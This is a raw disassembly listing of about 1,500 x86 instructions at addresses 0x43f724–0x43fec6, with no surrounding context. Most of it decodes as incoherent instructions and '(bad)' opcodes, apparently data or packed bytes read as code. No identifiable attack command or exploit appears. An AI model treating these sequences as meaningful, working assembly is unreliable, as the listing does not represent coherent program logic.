  43f724:	inc    edi
  43f725:	sub    ecx,DWORD PTR [ebx+eax*1-0x78]
  43f729:	(bad)  
  43f72a:	sti    
  43f72b:	inc    esp
  43f72c:	mov    esi,0xb2107b4b
  43f731:	sbb    ebp,edx
  43f733:	mov    edi,0xda4889f3
  43f738:	aas    
  43f739:	rol    BYTE PTR [ebx],cl
  43f73b:	fdivr  st,st(3)
  43f73d:	bound  edx,QWORD PTR [edi-0x7d9e3181]
  43f743:	add    ecx,DWORD PTR [ecx]
  43f745:	in     al,dx
  43f746:	test   BYTE PTR [eax+0x4a],ah
  43f749:	push   ds
  43f74a:	cld    
  43f74b:	push   edx
  43f74c:	int3   
  43f74d:	add    bh,ah
  43f74f:	rcl    DWORD PTR [edi-0x60],1
  43f752:	add    ecx,DWORD PTR [ebx+0x7]
  43f755:	popa   
  43f756:	cmp    dl,BYTE PTR [esi+edi*8+0x382fd00]
  43f75d:	int    0x2
  43f75f:	cld    
  43f760:	ror    DWORD PTR [edi-0x25],1
  43f763:	xor    eax,0xc341475b
  43f768:	test   DWORD PTR [ebx],eax
  43f76a:	jecxz  0x43f767
  43f76c:	inc    esp
  43f76d:	mov    esi,0xb2107acb
  43f772:	fwait
  43f773:	jmp    0xc8cdeb37
  43f778:	fnstcw WORD PTR [esi-0x7cee4cf6]
  43f77e:	repnz add BYTE PTR [ebx],0x0
  43f782:	fldcw  WORD PTR [edx-0x16a519bd]
  43f788:	(bad)  
  43f789:	shr    DWORD PTR [ebp+0x18],cl
  43f78c:	dec    esp
  43f78d:	xchg   BYTE PTR [edi],ah
  43f78f:	ficom  WORD PTR [ecx]
  43f791:	mov    dl,0x9a
  43f793:	add    esi,0xffffffe3
  43f796:	fstp   TBYTE PTR ds:0x8263b737
  43f79c:	add    eax,DWORD PTR [eax]
  43f79e:	xchg   ecx,eax
  43f79f:	loop   0x43f726
  43f7a1:	dec    edx
  43f7a2:	xchg   cl,bl
  43f7a4:	xor    DWORD PTR ds:0x8cd18ca7,esp
  43f7aa:	test   al,0x6d
  43f7ac:	test   al,0x6a
  43f7ae:	fsubr  QWORD PTR gs:[eax+0x2664258c]
  43f7b5:	mov    ah,0xde
  43f7b7:	fdiv   QWORD PTR [ecx+0x10]
  43f7ba:	lock and eax,0xa0008a96
  43f7c0:	ins    DWORD PTR es:[edi],dx
  43f7c1:	test   al,0x6b
  43f7c3:	gs call 0x996a3b20
  43f7c9:	loop   0x43f814
  43f7cb:	xchg   ebx,eax
  43f7cc:	packssdw mm3,mm6
  43f7cf:	sbb    ecx,ebx
  43f7d1:	(bad)  
  43f7d2:	xchg   DWORD PTR [esp+ebx*8-0x17],ecx
  43f7d6:	add    ebx,DWORD PTR [ebx+0x2f]
  43f7d9:	jmp    0x43f767
  43f7db:	sub    ecx,DWORD PTR [ecx+ecx*4+0x6695a88c]
  43f7e2:	into   
  43f7e3:	jmp    0x5a7fe302
  43f7e8:	das    
  43f7e9:	sbb    al,0x8a
  43f7eb:	and    BYTE PTR [ebp-0x22],bh
  43f7ee:	cdq    
  43f7ef:	pushf  
  43f7f0:	(bad)  [ecx]
  43f7f2:	fwait
  43f7f3:	int3   
  43f7f4:	ja     0x43f7df
  43f7f6:	add    edx,DWORD PTR [edi-0x3e318d88]
  43f7fc:	pop    ebx
  43f7fd:	daa    
  43f7fe:	or     ebx,ebp
  43f800:	or     eax,0x9c4ecb32
  43f805:	cmp    ch,BYTE PTR [ebx+0x5a]
  43f808:	xor    BYTE PTR [ecx+eax*2-0x2f9d6762],ah
  43f80f:	and    eax,0xe482dd64
  43f814:	sbb    eax,0xe07d41f6
  43f819:	out    0x99,al
  43f81b:	mov    ebp,0xfdac00db
  43f820:	lods   al,BYTE PTR ds:[esi]
  43f821:	mov    esi,0xe0bf0076
  43f826:	scas   al,BYTE PTR es:[edi]
  43f827:	xor    al,0x23
  43f829:	pop    ebp
  43f82a:	cmp    eax,0x2b7d91d5
  43f82f:	fcomp  DWORD PTR [edi+0x60]
  43f832:	mov    esp,0x8bd961f2
  43f837:	mov    cl,0x9f
  43f839:	jg     0x43f843
  43f83b:	out    dx,al
  43f83c:	xlat   BYTE PTR ds:[ebx]
  43f83d:	lahf   
  43f83e:	add    DWORD PTR [esi-0x56],esp
  43f841:	int    0x0
  43f843:	jmp    0x986f75b8
  43f848:	xlat   BYTE PTR ds:[ebx]
  43f849:	and    ebx,ebp
  43f84b:	push   ecx
  43f84c:	es jmp 0x43f856
  43f84f:	bound  ebp,QWORD PTR [ebx]
  43f851:	fistp  QWORD PTR [edi-0x688af1d7]
  43f857:	sub    DWORD PTR [esi+0x7e],ebx
  43f85a:	pop    eax
  43f85b:	jmp    0x43f8be
  43f85d:	(bad)  [ebx-0x3fd49a5f]
  43f863:	test   al,0x7f
  43f865:	out    0x83,al
  43f867:	dec    ecx
  43f868:	push   ebp
  43f869:	pop    esi
  43f86a:	inc    edi
  43f86b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f86c:	out    dx,al
  43f86d:	sbb    DWORD PTR [ecx+0x2e],ecx
  43f870:	pop    ebp
  43f871:	enter  0xe900,0x61
  43f875:	pop    esp
  43f876:	aas    
  43f877:	mov    cl,0xda
  43f879:	ss ins BYTE PTR es:[edi],dx
  43f87b:	test   eax,0xb736958
  43f880:	loope  0x43f875
  43f882:	hlt    
  43f883:	jmp    0xebd455e4
  43f888:	add    BYTE PTR [ecx-0x27],ah
  43f88b:	pop    es
  43f88c:	push   edi
  43f88d:	pusha  
  43f88e:	jo     0x43f8d5
  43f890:	adc    eax,0x9d3a0e9
  43f895:	mov    al,ds:0x9300bef5
  43f89a:	gs push edx
  43f89c:	clc    
  43f89d:	mov    BYTE PTR [edx-0x773c88d4],dh
  43f8a3:	(bad)  [ebx+0x1afa2cc]
  43f8a9:	jnp    0x43f885
  43f8ab:	add    bl,dl
  43f8ad:	sub    eax,ebx
  43f8af:	out    0x48,eax
  43f8b1:	push   0x8746f71a
  43f8b6:	stos   BYTE PTR es:[edi],al
  43f8b7:	fadd   QWORD PTR [ecx]
  43f8b9:	int3   
  43f8ba:	push   ds
  43f8bb:	or     eax,0x11f4b00
  43f8c0:	sbb    BYTE PTR [ebx-0x26],cl
  43f8c3:	add    BYTE PTR [ebx+0xef80d7e],al
  43f8c9:	mov    bh,0xa4
  43f8cb:	cmc    
  43f8cc:	dec    DWORD PTR [ebx]
  43f8ce:	arpl   WORD PTR [edx-0x20],cx
  43f8d1:	and    BYTE PTR [ecx-0x5ebb7419],cl
  43f8d7:	sub    al,0xc1
  43f8d9:	add    eax,0x72c11ca5
  43f8de:	mov    eax,ds:0xa9443bf3
  43f8e3:	jb     0x43f8f2
  43f8e5:	js     0x43f93e
  43f8e7:	mov    bh,0x1b
  43f8e9:	sti    
  43f8ea:	fld    DWORD PTR [eax]
  43f8ec:	sldt   WORD PTR [esi+0x56]
  43f8f0:	idiv   bh
  43f8f2:	retf   
  43f8f3:	bound  ecx,QWORD PTR [eax+0x30]
  43f8f6:	jo     0x43f914
  43f8f8:	jb     0x43f909
  43f8fa:	jo     0x43f918
  43f8fc:	jge    0x43f94d
  43f8fe:	mov    bh,0xda
  43f900:	dec    ecx
  43f901:	sub    BYTE PTR [edx-0x5f],al
  43f904:	repz sub eax,DWORD PTR [ebx-0x137502fd]
  43f90b:	int    0x1d
  43f90d:	enter  0xa688,0x27
  43f911:	mov    esp,DWORD PTR [edx+0x45]
  43f914:	dec    edi
  43f915:	xchg   BYTE PTR [edi],bl
  43f917:	lods   al,BYTE PTR ds:[esi]
  43f918:	mov    cl,BYTE PTR [eax+0x22]
  43f91b:	jmp    0xc17dd4f0
  43f920:	int    0x12
  43f922:	jmp    0xd94d63e7
  43f927:	push   esp
  43f928:	imul   esp,DWORD PTR [edx+ebx*4],0xffffffea
  43f92c:	mov    ebp,0x38c5eb3f
  43f931:	xchg   BYTE PTR [edi+0x56428b2e],bl
  43f937:	clc    
  43f938:	(bad)  
  43f939:	out    dx,eax
  43f93a:	mov    DWORD PTR [ecx-0x32],eax
  43f93d:	add    ch,cl
  43f93f:	inc    ecx
  43f940:	mov    eax,DWORD PTR [edx+0x2e]
  43f943:	fadd   DWORD PTR [esi+eax*4-0x61]
  43f947:	xor    cl,BYTE PTR [ecx+0x4b88064a]
  43f94d:	test   BYTE PTR [edi+0x488b4a],ah
  43f953:	mov    ds:0x39d3c7f7,al
  43f958:	aad    0x64
  43f95a:	xchg   BYTE PTR [edi+0x9076956],dl
  43f960:	add    BYTE PTR [esi-0x38089dba],0xd3
  43f967:	fcom   DWORD PTR [esi+0xa9f8502]
  43f96d:	test   DWORD PTR [edi],eax
  43f96f:	and    dl,BYTE PTR [ebx]
  43f971:	enter  0xebf3,0x45
  43f975:	imul   esi,DWORD PTR [edx-0x42],0xffffffff
  43f979:	aad    0x3f
  43f97b:	bound  ebp,QWORD PTR [ebx+0x7e]
  43f97e:	cmp    BYTE PTR [ebx-0x7e],ah
  43f981:	add    eax,ecx
  43f983:	pop    ebp
  43f984:	xchg   esi,eax
  43f985:	add    eax,DWORD PTR [eax]
  43f987:	bound  ebx,QWORD PTR [ecx]
  43f989:	sbb    edi,edi
  43f98b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f98c:	fldl2t 
  43f98e:	sbb    BYTE PTR [eax],0x69
  43f991:	jmp    0xe8a5d7a2
  43f996:	add    esp,DWORD PTR [edx+0x60]
  43f999:	pushf  
  43f99a:	imul   ebx,edi,0x24
  43f99d:	stos   BYTE PTR es:[edi],al
  43f99e:	mov    esp,DWORD PTR [ebp+0x19]
  43f9a1:	test   esi,0x6ba46285
  43f9a7:	mov    ds:0x6203cddc,al
  43f9ac:	fnop   
  43f9ae:	repz pop esp
  43f9b0:	je     0x43f99b
  43f9b2:	sbb    dl,0xe1
  43f9b5:	jmp    0x2929f9c6
  43f9ba:	jmp    0xbf9c5bc2
  43f9bf:	and    ecx,edi
  43f9c1:	mov    ebx,0xd981e764
  43f9c6:	push   0xffffffde
  43f9c8:	sub    ecx,ebx
  43f9ca:	(bad)  
  43f9cb:	xchg   DWORD PTR [edx+ebx*8+0x2b6b03e9],edx
  43f9d2:	jmp    0x43fa30
  43f9d4:	test   al,0x75
  43f9d6:	bound  ecx,QWORD PTR [ebp+0x1e]
  43f9d9:	jns    0x43fa06
  43f9db:	and    DWORD PTR [ebx],0xf5b670e1
  43f9e1:	xlat   BYTE PTR ds:[ebx]
  43f9e2:	mov    eax,ds:0xfbb8fb80
  43f9e7:	cmp    eax,0x288a1de6
  43f9ec:	mov    eax,ds:0x65ce7269
  43f9f1:	fisubr DWORD PTR [eax-0x11e52b09]
  43f9f7:	mov    ah,BYTE PTR [eax]
  43f9f9:	jns    0x43fa57
  43f9fb:	inc    ebx
  43f9fc:	push   ecx
  43f9fd:	ret    0xce72
  43fa00:	lds    ebx,FWORD PTR [edi-0x72]
  43fa03:	sti    
  43fa04:	and    eax,0xe22100c0
  43fa09:	lock adc cl,ch
  43fa0c:	lock and eax,0xa609ee6d
  43fa12:	(bad)  
  43fa13:	call   0x1417879
  43fa18:	mov    dl,bl
  43fa1a:	add    cl,ch
  43fa1c:	add    dl,bl
  43fa1e:	push   ds
  43fa1f:	or     DWORD PTR [edx-0x4c],esi
  43fa22:	imul   ecx,DWORD PTR [ecx+0x415a79a6],0xffffffb9
  43fa29:	loop   0x43fa1b
  43fa2b:	adc    cl,ch
  43fa2d:	ficom  DWORD PTR [esi]
  43fa2f:	icebp  
  43fa30:	jo     0x43fa55
  43fa32:	xchg   ebx,eax
  43fa33:	mov    ebp,DWORD PTR [edx-0x16e229cd]
  43fa39:	test   al,0x72
  43fa3b:	mul    DWORD PTR [edx-0x6b]
  43fa3e:	xor    esp,ecx
  43fa40:	fldenv [edx+esi*1-0x75]
  43fa44:	mov    dl,0x9f
  43fa46:	jnp    0x43fa50
  43fa48:	push   0xe9f672c7
  43fa4d:	popa   
  43fa4e:	xor    ah,al
  43fa50:	icebp  
  43fa51:	xor    cl,BYTE PTR fs:[ebx+0x187b9fb2]
  43fa58:	jmp    0xdf15:0xf13fada6
  43fa5f:	mov    ebp,DWORD PTR [esi+ebp*2]
  43fa62:	cwde   
  43fa63:	inc    eax
  43fa64:	loope  0x43fac5
  43fa66:	cmp    DWORD PTR [eax-0x17],eax
  43fa69:	jl     0x43fa71
  43fa6b:	xor    al,0x92
  43fa6d:	dec    ebp
  43fa6e:	addr16 mov edi,0xf772dcee
  43fa74:	jmp    0xe94cec55
  43fa79:	pop    eax
  43fa7a:	pop    ebp
  43fa7b:	xchg   cl,ch
  43fa7d:	popa   
  43fa7e:	fld    DWORD PTR [ebx+0x66a40000]
  43fa84:	test   DWORD PTR [esi],0xfff7593f
  43fa8a:	mov    ebx,0xe820f95b
  43fa8f:	mov    esp,0xdd477d75
  43fa94:	or     DWORD PTR [eax+edx*1-0x7bffff23],eax
  43fa9b:	dec    eax
  43fa9c:	cmc    
  43fa9d:	(bad)  
  43fa9e:	out    0xa,al
  43faa0:	jge    0x43fa70
  43faa2:	pop    eax
  43faa3:	std    
  43faa4:	xor    eax,0x7fe53d83
  43faa9:	push   ebp
  43faaa:	jae    0x43fa87
  43faac:	fadd   DWORD PTR [ebx-0x2199498b]
  43fab2:	sub    BYTE PTR [esi],0x1b
  43fab5:	je     0x43fa46
  43fab7:	bound  ecx,QWORD PTR [edx+0x8]
  43faba:	cld    
  43fabb:	pushf  
  43fabc:	lar    ebx,bx
  43fabf:	xchg   ebp,eax
  43fac0:	test   esi,0xfff7714c
  43fac6:	dec    ebx
  43fac7:	arpl   WORD PTR [eax],ax
  43fac9:	xor    ebx,0x6f
  43facc:	or     BYTE PTR [esi-0x700a5],al
  43fad2:	adc    DWORD PTR [eax],0xfffffff9
  43fad5:	push   esp
  43fad7:	das    
  43fad8:	dec    esp
  43fad9:	pop    edi
  43fada:	cmp    cl,0x5a
  43fadd:	ret    0xd603
  43fae0:	jge    0x43fb27
  43fae2:	repz bound ecx,QWORD PTR [edx-0x18]
  43fae6:	add    BYTE PTR [edx-0x62],dh
  43fae9:	or     ecx,DWORD PTR [ebx+0x107f0d46]
  43faef:	sub    BYTE PTR [ecx],0xfb
  43faf2:	mov    DWORD PTR [ebx],edx
  43faf4:	data16 jle 0x43fb47
  43faf7:	mov    edi,0x623c7064
  43fafc:	sub    al,BYTE PTR [eax+ebx*2-0x264d876]
  43fb03:	mov    ebp,0xe959037f
  43fb08:	sbb    al,0xb9
  43fb0a:	mov    ebp,0xd50e805a
  43fb0f:	jno    0x43fabb
  43fb11:	inc    edx
  43fb12:	add    BYTE PTR [esi-0x80],bh
  43fb15:	add    eax,DWORD PTR [eax]
  43fb17:	popf   
  43fb18:	cmp    al,0x3b
  43fb1a:	dec    BYTE PTR [ebp+0x5de5037f]
  43fb20:	mov    ebx,0xda7fd7c0
  43fb25:	pop    edx
  43fb26:	clc    
  43fb27:	jmp    0x1fc90668
  43fb2c:	fadd   DWORD PTR [edi+eax*2-0x103708aa]
  43fb33:	jmp    0x43fba7
  43fb35:	test   BYTE PTR [edx+0x56],dl
  43fb38:	jmp    0x7d00:0xb2db0fc4
  43fb3f:	(bad)
  43fb42:	xchg   BYTE PTR [ebp+0x76708bda],bl
  43fb48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43fb49:	test   BYTE PTR [eax+eax*1+0x4815a29f],0x52
  43fb51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fb52:	pop    es
  43fb53:	test   DWORD PTR [ebp+0x3],esp
  43fb56:	push   ebp
  43fb57:	sbb    dl,BYTE PTR [edi+0x68f77ca0]
  43fb5d:	mov    BYTE PTR [edx],0x7d
  43fb60:	xchg   DWORD PTR [esi-0x14be8c09],ecx
  43fb66:	mov    bh,0xdf
  43fb68:	jmp    0x602c003a
  43fb6d:	push   esi
  43fb6e:	pop    ecx
  43fb6f:	clc    
  43fb70:	fild   WORD PTR [edx-0x30]
  43fb73:	adc    esp,DWORD PTR [ebp-0x2a061927]
  43fb79:	jo     0x43fb64
  43fb7b:	mov    ecx,0x594d3136
  43fb80:	retf   0xa670
  43fb83:	mov    eax,es
  43fb85:	push   cs
  43fb86:	sub    al,0xc
  43fb88:	bound  esp,QWORD PTR [esp+ebp*4+0xb]
  43fb8c:	out    0x16,eax
  43fb8e:	sbb    ch,BYTE PTR ds:0xb762d520
  43fb94:	mov    ebp,0x94f3bfc4
  43fb99:	push   ss
  43fb9a:	repnz add ch,BYTE PTR [eax]
  43fb9d:	(bad)
  43fba0:	imul   ebx,DWORD PTR [esi+eax*4+0xb],0x33a46262
  43fba8:	icebp  
  43fba9:	test   eax,0xbdf13d5c
  43fbae:	push   0xffffffd9
  43fbb0:	add    BYTE PTR [ebp-0x27],dl
  43fbb3:	call   0xdf08:0x37646ccf
  43fbba:	pop    ss
  43fbbb:	add    ch,BYTE PTR ds:0x6c3a0b1f
  43fbc1:	jg     0x43fb99
  43fbc3:	jmp    0x732442cb
  43fbc8:	leave  
  43fbc9:	imul   esp,DWORD PTR [esi+ecx*1-0x4],0xb618a486
  43fbd1:	cmp    eax,0x6203c802
  43fbd6:	bound  esp,QWORD PTR [esi]
  43fbd8:	cld    
  43fbd9:	fcom   QWORD PTR [esi]
  43fbdb:	fimul  DWORD PTR [edx+eiz*2-0x6e0b6ea4]
  43fbe2:	fstp   QWORD PTR [esi-0x16269a42]
  43fbe8:	add    esp,DWORD PTR [edx+0x5c]
  43fbeb:	or     DWORD PTR [ecx],0xae00d871
  43fbf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fbf2:	xlat   BYTE PTR ds:[ebx]
  43fbf3:	add    al,ch
  43fbf5:	popa   
  43fbf6:	(bad)  [ebx-0x26972a4a]
  43fbfc:	add    bl,BYTE PTR [ecx]
  43fbfe:	mov    ebp,0xb0406ad2
  43fc03:	adc    DWORD PTR [ecx+0x6e],0xffffffe2
  43fc07:	lea    ebp,[ebx]
  43fc09:	pop    esi
  43fc0a:	and    al,0x9
  43fc0c:	mov    bl,0xe0
  43fc0e:	lea    eax,[eax+0x3d961e9]
  43fc14:	sbb    BYTE PTR [eax],al
  43fc16:	data16 or dh,BYTE PTR ds:0x9fac6a
  43fc1d:	jo     0x43fbf2
  43fc1f:	ret    
  43fc20:	ins    DWORD PTR es:[edi],dx
  43fc21:	in     eax,dx
  43fc22:	add    al,0x85
  43fc24:	ins    BYTE PTR es:[edi],dx
  43fc25:	out    0xe6,eax
  43fc27:	repnz add al,0xed
  43fc2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fc2b:	(bad)  
  43fc2c:	mov    esp,DWORD PTR [ecx+ebp*1-0x1b193fa5]
  43fc33:	cmp    dh,dh
  43fc35:	out    dx,al
  43fc36:	mov    ch,0x10
  43fc38:	pop    esp
  43fc39:	mov    eax,ds:0xdef771b9
  43fc3e:	adc    eax,0xa034dd56
  43fc43:	(bad)  
  43fc44:	add    BYTE PTR [edx+0x23],ah
  43fc47:	xchg   DWORD PTR [esi+0x22],edx
  43fc4a:	in     eax,dx
  43fc4b:	push   ebp
  43fc4c:	fstp   QWORD PTR [eax+eiz*4]
  43fc4f:	(bad)  
  43fc50:	add    BYTE PTR [ecx-0x74],dh
  43fc53:	jno    0x43fc4c
  43fc55:	scas   al,BYTE PTR es:[edi]
  43fc56:	aad    0x55
  43fc58:	fld    QWORD PTR [eax+eiz*4-0x2a]
  43fc5c:	add    BYTE PTR [esi-0x8ff5268],bh
  43fc62:	popf   
  43fc63:	lods   eax,DWORD PTR ds:[esi]
  43fc64:	add    BYTE PTR ds:0xadaa,bh
  43fc6a:	sub    esp,DWORD PTR [edx]
  43fc6c:	xor    eax,0x35209600
  43fc71:	add    BYTE PTR [eax],cl
  43fc73:	adc    eax,0x18070035
  43fc78:	xor    eax,0x17b80000
  43fc7d:	xor    eax,0x34aacf00
  43fc82:	add    dl,bl
  43fc84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43fc85:	xor    al,0x0
  43fc87:	sub    eax,0x660034a5
  43fc8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fc8d:	xor    al,0x0
  43fc8f:	bound  esp,QWORD PTR [esp+esi*1+0x34a47300]
  43fc96:	add    dh,dh
  43fc98:	test   al,0x34
  43fc9a:	add    BYTE PTR [eax+0x340034a8],ah
  43fca0:	stos   DWORD PTR es:[edi],eax
  43fca1:	xor    al,0x0
  43fca3:	test   al,0xab
  43fca5:	xor    al,0x0
  43fca7:	mov    bh,BYTE PTR [esi-0x40eaffcc]
  43fcad:	xor    al,0x0
  43fcaf:	movsx  esi,WORD PTR [eax+eax*1]
  43fcb3:	sbb    eax,0x400034ad
  43fcb8:	lods   eax,DWORD PTR ds:[esi]
  43fcb9:	xor    al,0x0
  43fcbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43fcbc:	mov    bl,0x34
  43fcbe:	add    al,ch
  43fcc0:	scas   eax,DWORD PTR es:[edi]
  43fcc1:	xor    al,0x0
  43fcc3:	mov    dl,0xb2
  43fcc5:	xor    al,0x0
  43fcc7:	into   
  43fcc8:	mov    bl,0x34
  43fcca:	add    BYTE PTR [esi-0x4f],bh
  43fccd:	xor    al,0x0
  43fccf:	and    BYTE PTR [esi-0x4ec8ffcc],ah
  43fcd5:	xor    al,0x0
  43fcd7:	outs   dx,BYTE PTR ds:[esi]
  43fcd8:	mov    al,0x34
  43fcda:	add    dh,bl
  43fcdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fcdd:	xor    al,0x0
  43fcdf:	add    BYTE PTR [ebp+0x620034a5],bl
  43fce5:	xor    al,0x2c
  43fce7:	cmp    al,0x62
  43fce9:	cmp    eax,0x24623c2c
  43fcee:	aas    
  43fcef:	retf   
  43fcf0:	push   ds
  43fcf1:	cmp    al,0x3f
  43fcf3:	retf   
  43fcf4:	push   ss
  43fcf5:	int    0x8b
  43fcf7:	jmp    0x43fd2d
  43fcf9:	sti    
  43fcfa:	rol    BYTE PTR [edi],1
  43fcfc:	fisttp WORD PTR ds:0x35d93ac8
  43fd02:	out    dx,eax
  43fd03:	and    BYTE PTR [edx+0x2c85058b],0xd4
  43fd0a:	add    esi,0x3f8bc72e
  43fd10:	jbe    0x43fd07
  43fd12:	inc    ebx
  43fd13:	jae    0x43fd6d
  43fd15:	push   eax
  43fd16:	mov    al,BYTE PTR [ecx+0x4a]
  43fd19:	push   eax
  43fd1a:	dec    esi
  43fd1b:	into   
  43fd1c:	loope  0x43fcd9
  43fd1e:	or     eax,DWORD PTR [ebp+0x518a6c1c]
  43fd24:	cmp    bh,bl
  43fd26:	mov    ch,0x23
  43fd28:	adc    esi,DWORD PTR [edx]
  43fd2a:	dec    esi
  43fd2b:	iret   
  43fd2c:	loope  0x43fce9
  43fd2e:	or     eax,ecx
  43fd30:	and    al,0x8c
  43fd32:	add    eax,DWORD PTR [eax]
  43fd34:	bound  eax,QWORD PTR [eax+0x5dbcc012]
  43fd3a:	inc    ecx
  43fd3b:	add    esp,DWORD PTR [edx+0x3a]
  43fd3e:	dec    esi
  43fd3f:	clc    
  43fd40:	dec    ebp
  43fd41:	mov    WORD PTR [esi+0x7f20005a],gs
  43fd47:	add    ecx,esp
  43fd49:	cs dec edi
  43fd4b:	dec    eax
  43fd4c:	retf   
  43fd4d:	es daa 
  43fd4f:	dec    eax
  43fd50:	retf   
  43fd51:	push   ds
  43fd52:	aas    
  43fd53:	dec    eax
  43fd54:	retf   
  43fd55:	push   ss
  43fd56:	into   
  43fd57:	mov    ebx,ebp
  43fd59:	jmp    0x6ac90213
  43fd5e:	fldenv [ebx+ecx*2-0x6f]
  43fd62:	enter  0xaf72,0x55
  43fd66:	pusha  
  43fd67:	sub    eax,edi
  43fd69:	scas   eax,DWORD PTR es:[edi]
  43fd6a:	pusha  
  43fd6b:	sub    al,0x8
  43fd6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fd6e:	or     DWORD PTR [edi+0x33],edi
  43fd71:	outs   dx,BYTE PTR ds:[esi]
  43fd72:	xchg   ebp,eax
  43fd73:	in     eax,0xb6
  43fd75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fd76:	pusha  
  43fd77:	sbb    al,0xf4
  43fd79:	out    0x6,al
  43fd7b:	(bad)  
  43fd7c:	mov    dl,0xde
  43fd7e:	and    esi,edi
  43fd80:	mov    cl,0xe6
  43fd82:	or     DWORD PTR [edx],ecx
  43fd84:	mov    bl,0xca
  43fd86:	xchg   DWORD PTR [edx+0x40],ebp
  43fd89:	imul   ecx,DWORD PTR [esi],0x9da9482b
  43fd8f:	sub    eax,0x259d9948
  43fd94:	dec    eax
  43fd95:	cdq    
  43fd96:	popf   
  43fd97:	xchg   esp,eax
  43fd98:	mov    BYTE PTR [ecx-0x20f46ba0],cl
  43fd9e:	sbb    bh,dl
  43fda0:	jle    0x43fd6f
  43fda2:	in     eax,0x2
  43fda4:	mov    DWORD PTR [eax],esi
  43fda6:	shl    DWORD PTR [edx-0x35],1
  43fda9:	add    BYTE PTR [ecx+0x7],bl
  43fdac:	arpl   WORD PTR [edi-0x508cf8af],bp
  43fdb2:	pop    ebp
  43fdb3:	pop    es
  43fdb4:	jae    0x43fd65
  43fdb6:	pop    ecx
  43fdb7:	pop    es
  43fdb8:	cdq    
  43fdb9:	push   esp
  43fdba:	sub    eax,0xb8f01d58
  43fdbf:	cwde   
  43fdc0:	jb     0x43fd80
  43fdc2:	pop    ebp
  43fdc3:	test   al,0xbb
  43fdc5:	sbb    BYTE PTR [edx],ah
  43fdc7:	out    0xe4,al
  43fdc9:	sbb    BYTE PTR [ecx-0x4900b23b],dl
  43fdcf:	mov    eax,ds:0x5feeb6be
  43fdd4:	or     al,0xfc
  43fdd6:	xchg   edi,eax
  43fdd7:	pusha  
  43fdd8:	add    BYTE PTR [eax],bl
  43fdda:	sbb    bl,BYTE PTR [esp+ecx*4]
  43fddd:	and    al,0x6a
  43fddf:	or     DWORD PTR [eax+ebp*1-0x4607e4c2],ecx
  43fde6:	loop   0x43fd7f
  43fde8:	adc    BYTE PTR [ebx+eiz*4],dh
  43fdeb:	mov    al,ds:0xa09d9dc4
  43fdf0:	les    esi,FWORD PTR [ebp-0x523b5f5b]
  43fdf6:	popf   
  43fdf7:	mov    al,ds:0x7feb1cc4
  43fdfc:	mov    esp,DWORD PTR [esi+eiz*2]
  43fdff:	out    dx,al
  43fe00:	js     0x43fdfb
  43fe02:	popa   
  43fe03:	push   esi
  43fe04:	inc    ebp
  43fe05:	in     eax,dx
  43fe06:	ficomp DWORD PTR [ebx]
  43fe08:	adc    eax,0xae7f3b8
  43fe0d:	bound  eax,QWORD PTR [eax]
  43fe0f:	mov    eax,ds:0xe219f7df
  43fe14:	xchg   edi,eax
  43fe15:	or     BYTE PTR [edx+eiz*1+0x370d4055],bl
  43fe1c:	pushf  
  43fe1d:	and    DWORD PTR ds:0x26f8ee69,0xffffff9c
  43fe24:	fmul   DWORD PTR [ebx]
  43fe26:	sub    edx,esp
  43fe28:	xchg   ebp,eax
  43fe29:	div    DWORD PTR [edx+eiz*1+0x22acd2bd]
  43fe30:	mov    al,ds:0xa02535c4
  43fe35:	les    ebp,FWORD PTR ds:0x9fc4a01d
  43fe3b:	jmp    0x6c68:0xd419ef7c
  43fe42:	or     al,0xe3
  43fe44:	ss sbb al,0xe9
  43fe47:	popa   
  43fe48:	fld    DWORD PTR [eax]
  43fe4a:	fbld   TBYTE PTR [edi+0x60f0736d]
  43fe50:	daa    
  43fe51:	adc    DWORD PTR [eax],eax
  43fe53:	sub    BYTE PTR [edi-0x2a1b1d8a],ah
  43fe59:	add    BYTE PTR [eax],al
  43fe5b:	retf   0xd
  43fe5e:	xor    edi,edi
  43fe60:	icebp  
  43fe61:	iret   
  43fe62:	and    bh,BYTE PTR [ebx]
  43fe64:	aad    0x37
  43fe66:	dec    esi
  43fe67:	outs   dx,BYTE PTR ds:[esi]
  43fe68:	repz inc esp
  43fe6a:	push   edi
  43fe6b:	mov    BYTE PTR [edi],al
  43fe6d:	sbb    BYTE PTR [edi],cl
  43fe6f:	mov    DWORD PTR [edx-0xb],ebp
  43fe72:	inc    DWORD PTR [eax]
  43fe74:	sti    
  43fe75:	jmp    0x43fe70
  43fe77:	rcl    esp,0xe0
  43fe7a:	jge    0x43fe7b
  43fe7c:	sbb    dh,dl
  43fe7e:	jge    0x43fe50
  43fe80:	or     cl,BYTE PTR [eax+ecx*1]
  43fe83:	mov    esp,DWORD PTR [ebx]
  43fe85:	adc    al,0xdd
  43fe87:	or     BYTE PTR [edx],bh
  43fe89:	repnz clc 
  43fe8b:	add    bl,cl
  43fe8d:	(bad)  
  43fe8e:	ja     0x43fe72
  43fe90:	and    al,0xd5
  43fe92:	add    BYTE PTR [eax],al
  43fe94:	xor    BYTE PTR [ecx-0x6e],dh
  43fe97:	fcomp  DWORD PTR [ebp-0x6b]
  43fe9a:	div    DWORD PTR [edx]
  43fe9c:	mov    edi,0xcb2acfe9
  43fea1:	(bad)  
  43fea2:	jge    0x43fe7c
  43fea4:	cmp    cl,BYTE PTR [edx]
  43fea6:	adc    BYTE PTR [ebx],dh
  43fea8:	(bad)
  43feac:	retf   
  43fead:	(bad)  
  43feae:	and    edi,edi
  43feb0:	mov    edx,esi
  43feb2:	add    BYTE PTR [ebx],dh
  43feb4:	(bad)  
  43feb5:	popa   
  43feb6:	iret   
  43feb7:	cs mov ebx,0x4f5125d6
  43febd:	jmp    0x43fe74
  43febf:	shl    DWORD PTR [ebx+0x65],0x22
  43fec3:	(bad)  
  43fec4:	cmp    edx,esi
  43fec6:	add    BYTE PTR [ebx+0x26cf613f],cl
